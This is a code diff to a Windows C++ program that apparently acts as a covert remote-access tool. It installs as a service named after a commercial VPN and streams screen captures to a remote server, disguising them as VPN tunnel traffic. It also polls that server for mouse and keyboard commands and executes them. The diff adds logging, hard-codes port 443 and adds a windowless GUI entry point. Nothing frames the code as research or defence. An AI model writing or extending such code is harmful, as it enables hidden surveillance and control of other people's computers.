@@ -11,7 +11,13 @@
 #include <mutex>
 #include <fstream>
 
-#define WIN32_LEAN_AND_MEAN
+#ifndef DEBUG_LOG
+#define DEBUG_LOG(msg) do { \
+    std::ofstream dbg("debug.log", std::ios::app); \
+    dbg << "[DEBUG] " << msg << " (" << __FUNCTION__ << ":" << __LINE__ << ")" << std::endl; \
+} while (0)
+#endif
+
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -408,20 +414,26 @@ private:
     
     SocketResponse makeVPNRequest(const std::string& method, const std::string& path, const std::string& data = "") {
         SocketResponse response = {0, "", false};
-        
+        DEBUG_LOG("Preparing VPN request: " << method << " " << path);
+
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) return response;
-        
+        if (sock == INVALID_SOCKET) {
+            DEBUG_LOG("socket() failed");
+            return response;
+        }
+
         sockaddr_in server_addr;
         server_addr.sin_family = AF_INET;
         server_addr.sin_port = htons(server_port);
         inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
-        
+
         if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
+            DEBUG_LOG("connect() failed");
             closesocket(sock);
             return response;
         }
-        
+
+        DEBUG_LOG("Connected, building request");
         // Build HTTP request manually
         std::stringstream request;
         request << method << " " << path << " HTTP/1.1\r\n";
@@ -451,51 +463,62 @@ private:
         
         std::string request_str = request.str();
         send(sock, request_str.c_str(), request_str.length(), 0);
-        
+        DEBUG_LOG("Request sent, awaiting response");
+
         // Read response
         char buffer[8192];
         int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
             std::string response_str(buffer);
-            
+
             // Parse status code
             size_t status_pos = response_str.find(" ");
             if (status_pos != std::string::npos) {
                 response.status_code = std::stoi(response_str.substr(status_pos + 1, 3));
             }
-            
+
             // Extract body
             size_t body_pos = response_str.find("\r\n\r\n");
             if (body_pos != std::string::npos) {
                 response.body = response_str.substr(body_pos + 4);
             }
-            
+
             response.success = true;
+            DEBUG_LOG("Received response with status " << response.status_code);
+        } else {
+            DEBUG_LOG("No response received");
         }
-        
+
         closesocket(sock);
         return response;
     }
-    
+
     void processRemoteCommand(const std::string& commandData) {
+        DEBUG_LOG("Processing command: " << commandData);
         std::istringstream iss(commandData);
         std::string type;
-        if (!std::getline(iss, type, ':')) return;
-        
+        if (!std::getline(iss, type, ':')) {
+            DEBUG_LOG("Malformed command");
+            return;
+        }
+
         if (type == "click") {
             int x, y;
             if (iss >> x && iss.ignore() && iss >> y) {
+                DEBUG_LOG("Mouse click at " << x << "," << y);
                 input_handler.sendMouseClick(x, y);
             }
         } else if (type == "rightclick") {
             int x, y;
             if (iss >> x && iss.ignore() && iss >> y) {
+                DEBUG_LOG("Right click at " << x << "," << y);
                 input_handler.sendRightClick(x, y);
             }
         } else if (type == "key") {
             std::string key;
             if (std::getline(iss, key)) {
+                DEBUG_LOG("Key press: " << key);
                 input_handler.sendKeyPress(key);
             }
         }
@@ -512,8 +535,9 @@ public:
         : server_host(host), server_port(port), gen(rd()), main_socket(INVALID_SOCKET) {}
     
     bool establishTunnel() {
+        DEBUG_LOG("Attempting to establish tunnel");
         SocketResponse response = makeVPNRequest("GET", "/vpn/auth");
-        
+
         if (response.success && response.status_code == 200) {
             size_t pos = response.body.find("\"session\":\"");
             if (pos != std::string::npos) {
@@ -521,17 +545,20 @@ public:
                 size_t end = response.body.find("\"", pos);
                 if (end != std::string::npos) {
                     session_id = response.body.substr(pos, end - pos);
+                    DEBUG_LOG("Tunnel established with session " << session_id);
                     return true;
                 }
             }
         }
+        DEBUG_LOG("Failed to establish tunnel");
         return false;
     }
     
     void checkForCommands() {
         std::string path = "/vpn/control/" + session_id;
+        DEBUG_LOG("Checking for remote commands");
         SocketResponse response = makeVPNRequest("GET", path);
-        
+
         if (response.success && response.status_code == 200 && !response.body.empty()) {
             size_t pos = response.body.find("\"input\":\"");
             if (pos != std::string::npos) {
@@ -541,6 +568,7 @@ public:
                     std::string inputCmd = response.body.substr(pos, end - pos);
                     if (!inputCmd.empty()) {
                         std::string decoded = DataEncoder::decode(inputCmd);
+                        DEBUG_LOG("Received command: " << decoded);
                         processRemoteCommand(decoded);
                     }
                 }
@@ -550,9 +578,12 @@ public:
     
     void sendDesktopFrame() {
         std::vector<BYTE> frameData = screen_capture.captureFrame();
-        
-        if (frameData.empty()) return;
-        
+
+        if (frameData.empty()) {
+            DEBUG_LOG("No frame captured");
+            return;
+        }
+
         // Only send if frame changed significantly
         bool frameChanged = true;
         if (!last_frame_data.empty() && last_frame_data.size() == frameData.size()) {
@@ -562,12 +593,13 @@ public:
             }
             frameChanged = (differences > frameData.size() / 10000);
         }
-        
+
         if (frameChanged) {
+            DEBUG_LOG("Frame changed, sending " << frameData.size() << " bytes");
             // Compress the frame data
             std::vector<BYTE> compressed = DataCompressor::compressRLE(frameData);
             std::string encoded = DataEncoder::encode(compressed);
-            
+
             // Create tunnel payload
             std::stringstream payload;
             payload << "{";
@@ -579,40 +611,46 @@ public:
             payload << "\"format\":\"rgb24\",";
             payload << "\"data\":\"" << encoded << "\"";
             payload << "}";
-            
+
             // Send wrapped as VPN tunnel data
-            makeVPNRequest("POST", "/vpn/tunnel/" + session_id, 
+            makeVPNRequest("POST", "/vpn/tunnel/" + session_id,
                           VPNProtocol::wrapAsTunnelData(payload.str()));
-            
+
             last_frame_data = frameData;
         }
     }
     
     void run() {
+        DEBUG_LOG("Client run starting");
         if (!screen_capture.initialize()) {
+            DEBUG_LOG("Screen capture initialization failed");
             return;
         }
-        
+
         while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
             try {
                 if (establishTunnel()) {
                     // Main communication loop
+                    DEBUG_LOG("Entering main communication loop");
                     while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
                         sendDesktopFrame();
                         checkForCommands();
                         adaptiveDelay();
                     }
                 }
-                
+
                 // Reconnection delay
+                DEBUG_LOG("Tunnel closed, waiting to reconnect");
                 if (WaitForSingleObject(g_ServiceStopEvent, g_config.reconnect_interval * 1000) == WAIT_OBJECT_0) {
                     break;
                 }
-                
+
             } catch (const std::exception& e) {
+                DEBUG_LOG("Exception: " << e.what());
                 std::this_thread::sleep_for(std::chrono::seconds(5));
             }
         }
+        DEBUG_LOG("Client run exiting");
     }
 };
 
@@ -673,6 +711,7 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
     WSACleanup();
     return 0;
 }
+
 
 // Service control handler
 VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
@@ -875,7 +914,9 @@ static std::vector<Subnet> GetLocalSubnets() {
 // Attempt to locate a server on the local network by scanning each subnet
 // associated with this machine's adapters.
 std::string DiscoverLocalServer(int port) {
+    DEBUG_LOG("DiscoverLocalServer scanning on port " << port);
     if (!g_config.server_host.empty()) {
+        DEBUG_LOG("Checking configured host " << g_config.server_host);
         SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock != INVALID_SOCKET) {
             DWORD timeout = 200;
@@ -890,8 +931,10 @@ std::string DiscoverLocalServer(int port) {
             int result = connect(sock, (sockaddr*)&addr, sizeof(addr));
             closesocket(sock);
             if (result == 0) {
+                DEBUG_LOG("Configured host reachable");
                 return g_config.server_host;
             }
+            DEBUG_LOG("Configured host unreachable");
         }
     }
 
@@ -933,6 +976,7 @@ std::string DiscoverLocalServer(int port) {
             closesocket(sock);
 
             if (result == 0) {
+                DEBUG_LOG("Server discovered at " << ipStr);
                 return ipStr;
             }
         }
@@ -942,7 +986,11 @@ std::string DiscoverLocalServer(int port) {
 }
 
 int main(int argc, char* argv[]) {
-    if (argc == 3) {
+    DEBUG_LOG("Main start with " << argc << " args");
+    if ((argc == 2) &&
+        std::string(argv[1]) != "install" &&
+        std::string(argv[1]) != "uninstall" &&
+        std::string(argv[1]) != "console") {
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
             std::cout << "Failed to initialize Winsock" << std::endl;
@@ -950,12 +998,10 @@ int main(int argc, char* argv[]) {
         }
 
         std::string host = argv[1];
-        int port = std::stoi(argv[2]);
-
         std::cout << "Running in console mode...\n";
-        std::cout << "Connecting to: " << host << ":" << port << std::endl;
+        std::cout << "Connecting to: " << host << ":443" << std::endl;
 
-        VPNTunnelClient client(host, port);
+        VPNTunnelClient client(host, 443);
 
         g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
 
@@ -967,14 +1013,13 @@ int main(int argc, char* argv[]) {
 
     if (argc > 1) {
         std::string command = argv[1];
+        DEBUG_LOG("Command mode: " << command);
 
         if (command == "install") {
             int port = g_config.server_port;
-            if (argc >= 3) {
-                port = std::stoi(argv[2]);
-            }
 
             if (InstallService(port)) {
+                DEBUG_LOG("Service installed on port " << port);
                 std::cout << "Service installed successfully.\n";
                 std::cout << "Listening on port: " << port << "\n";
                 std::cout << "Use 'net start NordVPNService' to start the service.\n";
@@ -986,6 +1031,7 @@ int main(int argc, char* argv[]) {
         }
         else if (command == "uninstall") {
             if (UninstallService()) {
+                DEBUG_LOG("Service uninstalled");
                 std::cout << "Service uninstalled successfully.\n";
                 return 0;
             } else {
@@ -993,7 +1039,7 @@ int main(int argc, char* argv[]) {
                 return 1;
             }
         }
-        else if (command == "console" && argc == 4) {
+        else if (command == "console" && argc == 3) {
             // Run in console mode for testing
             WSADATA wsaData;
             if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -1002,12 +1048,10 @@ int main(int argc, char* argv[]) {
             }
 
             std::string host = argv[2];
-            int port = std::stoi(argv[3]);
-
             std::cout << "Running in console mode...\n";
-            std::cout << "Connecting to: " << host << ":" << port << std::endl;
+            std::cout << "Connecting to: " << host << ":443" << std::endl;
 
-            VPNTunnelClient client(host, port);
+            VPNTunnelClient client(host, 443);
 
             // Create a fake stop event for console mode
             g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
@@ -1025,6 +1069,7 @@ int main(int argc, char* argv[]) {
     };
 
     if (StartServiceCtrlDispatcherW(ServiceTable) != FALSE) {
+        DEBUG_LOG("Service control dispatcher started");
         return 0;
     }
 
@@ -1051,3 +1096,11 @@ int main(int argc, char* argv[]) {
     WSACleanup();
     return 0;
 }
+
+#ifdef _WIN32
+extern int main(int argc, char* argv[]);
+// Allow running without a console window when built as a GUI application
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    return main(__argc, __argv);
+}
+#endif
